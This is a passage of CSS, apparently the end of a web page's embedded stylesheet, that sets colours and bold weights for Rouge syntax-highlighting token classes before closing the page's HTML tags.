  color: #000000;
  font-weight: bold;
}
pre.rouge .kt {
  color: #445588;
  font-weight: bold;
}
pre.rouge .k, pre.rouge .kv {
  color: #000000;
  font-weight: bold;
}
pre.rouge .mf {
  color: #009999;
}
pre.rouge .mh {
  color: #009999;
}
pre.rouge .il {
  color: #009999;
}
pre.rouge .mi {
  color: #009999;
}
pre.rouge .mo {
  color: #009999;
}
pre.rouge .m, pre.rouge .mb, pre.rouge .mx {
  color: #009999;
}
pre.rouge .sb {
  color: #d14;
}
pre.rouge .sc {
  color: #d14;
}
pre.rouge .sd {
  color: #d14;
}
pre.rouge .s2 {
  color: #d14;
}
pre.rouge .se {
  color: #d14;
}
pre.rouge .sh {
  color: #d14;
}
pre.rouge .si {
  color: #d14;
}
pre.rouge .sx {
  color: #d14;
}
pre.rouge .sr {
  color: #009926;
}
pre.rouge .s1 {
  color: #d14;
}
pre.rouge .ss {
  color: #990073;
}
pre.rouge .s, pre.rouge .sa, pre.rouge .dl {
  color: #d14;
}
pre.rouge .na {
  color: #008080;
}
pre.rouge .bp {
  color: #999999;
}
pre.rouge .nb {
  color: #0086B3;
}
pre.rouge .nc {
  color: #445588;
  font-weight: bold;
}
pre.rouge .no {
  color: #008080;
}
pre.rouge .nd {
  color: #3c5d5d;
  font-weight: bold;
}
pre.rouge .ni {
  color: #800080;
}
pre.rouge .ne {
  color: #990000;
  font-weight: bold;
}
pre.rouge .nf, pre.rouge .fm {
  color: #990000;
  font-weight: bold;
}
pre.rouge .nl {
  color: #990000;
  font-weight: bold;
}
pre.rouge .nn {
  color: #555555;
}
pre.rouge .nt {
  color: #000080;
}
pre.rouge .vc {
  color: #008080;
}
pre.rouge .vg {
  color: #008080;
}
pre.rouge .vi {
  color: #008080;
}
pre.rouge .nv, pre.rouge .vm {
  color: #008080;
}
pre.rouge .ow {
  color: #000000;
  font-weight: bold;
}
pre.rouge .o {
  color: #000000;
  font-weight: bold;
}
pre.rouge .w {
  color: #bbbbbb;
}
pre.rouge {
  background-color: #f8f8f8;
}
</style>
</body>
</html>